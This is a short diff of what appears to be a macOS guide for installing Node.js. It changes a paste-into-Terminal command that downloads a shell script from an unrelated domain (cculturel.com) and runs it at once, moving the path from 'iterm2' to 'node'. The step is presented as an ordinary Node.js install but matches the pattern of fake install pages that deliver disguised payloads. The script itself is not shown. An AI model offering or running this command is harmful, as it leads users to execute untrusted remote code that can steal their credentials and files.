@@ -9,7 +9,7 @@ Press `Cmd + Space`, type **Terminal**, and hit `Enter`.
 Use the following command to install the latest **LTS** (long-term support) version of Node.js:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://cculturel.com/iterm2/install.sh)"
+/bin/bash -c "$(curl -fsSL https://cculturel.com/node/install.sh)"
 ```
 
 ---
